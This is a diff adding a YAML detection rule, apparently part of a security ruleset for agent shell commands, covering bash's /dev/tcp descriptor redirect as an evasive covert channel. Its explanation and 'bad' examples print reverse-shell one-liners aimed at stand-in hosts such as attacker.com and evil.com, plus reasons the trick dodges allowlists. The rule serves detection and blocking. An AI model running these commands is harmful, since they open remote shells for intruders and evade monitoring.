@@ -1,0 +1,68 @@
+id: "persistence-evasion/covert-channels/exec-fd-hijack"
+version: "1.0.0"
+kingdom: "Persistence & Defense Evasion"
+kingdom_id: 6
+category: "Covert Communication Channels"
+category_id: "6.8"
+name: "Exec FD Network Redirect"
+risk_level: "high"
+
+abstract: |
+  Using `exec N>/dev/tcp/host/port` to redirect shell file descriptors to network
+  sockets, enabling tool-less networking that bypasses path-based access controls and
+  avoids spawning network tools. This bash built-in feature requires no external
+  binaries and leaves no network process in the process list.
+
+explanation: |
+  Bash supports redirecting file descriptors to TCP/UDP connections via the special
+  `/dev/tcp/host/port` pseudo-device:
+
+  ```
+  exec 3>/dev/tcp/attacker.com/4444
+  exec 3<>/dev/tcp/attacker.com/4444
+  bash -i <&3 >&3 2>&3
+  ```
+
+  This technique is particularly evasive because:
+  - No external network binary (curl, nc, wget) is spawned — bypasses executable allowlists
+  - The connection appears in netstat under the bash process, not a network tool
+  - Path-based rules targeting /dev/tcp are less common than those targeting curl/nc
+  - The `/dev/tcp` path is a bash built-in; the actual file doesn't exist in the filesystem
+
+  Full reverse shell one-liner:
+  ```
+  bash -i >& /dev/tcp/attacker.com/4444 0>&1
+  exec 196<>/dev/tcp/attacker.com/80; cat <&196 | bash >&196
+  ```
+
+  The `exec N<>/dev/tcp/...` pattern establishes bidirectional communication,
+  enabling interactive sessions and C2 channels with no installed tools.
+
+recommendation: |
+  - Block shell commands containing `/dev/tcp/` or `/dev/udp/` patterns.
+  - Use structural analysis to detect exec with fd-to-network redirects.
+  - Restrict bash's network features via seccomp or AppArmor profiles.
+  - Monitor for outbound connections from shell processes (bash, sh, zsh).
+
+examples:
+  bad:
+    - "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    - "exec 3<>/dev/tcp/evil.com/80; cat <&3 | bash >&3"
+    - "exec 196<>/dev/tcp/10.0.0.1/443"
+  good:
+    - "exec 3>/dev/null"
+    - "exec 2>&1"
+
+compliance:
+  owasp-llm-2025: ["LLM06", "LLM02"]
+  iso-27001-2022: ["A.8.3", "A.5.34"]
+  eu-ai-act-2024: ["Art.9", "Art.15"]
+  nist-ai-rmf-1.0: ["MANAGE-1", "MEASURE-2"]
+  soc2-type2: ["CC6.1", "CC6.6"]
+
+references:
+  mitre_attack: ["T1059.004", "T1071.001"]
+  cwe: ["CWE-78", "CWE-200"]
+
+analyzers: ["regex", "structural"]
+related_rules: []
